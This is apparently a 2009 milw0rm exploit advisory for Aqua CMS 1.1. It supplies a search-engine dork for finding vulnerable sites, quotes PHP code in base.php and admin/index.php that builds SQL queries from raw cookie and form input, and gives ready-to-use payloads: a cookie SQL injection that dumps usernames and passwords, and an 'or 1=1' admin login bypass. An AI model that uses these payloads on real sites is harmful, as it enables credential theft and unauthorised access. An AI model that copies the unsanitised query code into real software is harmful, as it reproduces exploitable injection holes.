@@ -1,0 +1,87 @@
+================================================================================
+
+Found : halkfild
+Dork : "Powered By Aqua Cms"
+Vendor: http://www.aquacms.net/
+Advisory URL: http://crackfor.me/bugtraq/aquacms.v1.1.txt
+Visit : crackfor.me, forum.antichat.ru, raz0r.name
+Mail : bugtraq[d0g]crackfor.me
+Home : http://crackfor.me - online md5 crack service
+
+================================================================================
+
+  SQL-injections:
+  Need: magic quotes = off
+
+
+ vuln file: /droplets/functions/base.php
+ vuln code:
+
+65:// Check the status of the orders
+
+if(isset($_COOKIE["userSID"])) {
+$sqltable = $sitename."_orders";
+$selck = $_COOKIE["userSID"];
+mysql_select_db($database, $dbconnect);
+$query_cartcheck = "SELECT SID FROM $sqltable WHERE SID = '$selck' AND status = 1";  
+$cartcheck = mysql_query($query_cartcheck, $dbconnect) or die(mysql_error());
+$row_cartcheck = mysql_fetch_assoc($cartcheck);
+$totalRows_cartcheck = mysql_num_rows($cartcheck);
+
+if ($totalRows_cartcheck != 0) {
+ $user_ip_address = $_SERVER['REMOTE_ADDR'];
+ $dt=date("YmdHis"); 
+ $UID="$dt$user_ip_address";
+ setcookie("userSID", $UID, time()+36000);
+}
+
+}
+
+
+PoC: COOKIE: userSID='[foo]
+
+users passwords: select concat_ws(0x3a3a,username,password)+from+aqua.[prefix_here]_users+--+
+
+-----------------------------------------------------------------------------------
+
+
+  Auth bypass
+  Need: magic quotes = off
+
+ vuln file: /admin/index.php
+ vuln code:
+
+10:
+if (isset($_POST['username']) == TRUE) {
+ $uusername = $_POST['username'];
+ $upassword = $_POST['password'];
+ $sqltable = $sitename."_users";
+ mysql_select_db($database, $dbconnect);
+ $query_getuser = "
+ SELECT * 
+ FROM $sqltable 
+ WHERE username = '$uusername' 
+ AND password = '$upassword' 
+ AND groups != '' 
+ ";
+ $getuser = mysql_query($query_getuser, $dbconnect) or die("Unable to select database");
+ $row_getuser = mysql_fetch_assoc($getuser);
+ $totalRows_getuser = mysql_num_rows($getuser);
+ 
+ if ($totalRows_getuser == 1) {
+  $uid = $row_getuser['id'];
+  $uun = $row_getuser['username'];
+  $ugr = $row_getuser['groups'];
+  $setwsuser = $uid.":".$uun.":".$ugr; 
+  //setcookie("wsuser", $setwsuser, time()+36000, '/');
+  //header("Location: index.php");
+ } 
+ 
+// User logon: end
+}
+
+
+PoC: POST: username='[foo]
+Exploit: POST: username=crackfor.me'+or+1=1+limit+1+--+ 
+
+# milw0rm.com [2009-04-14]
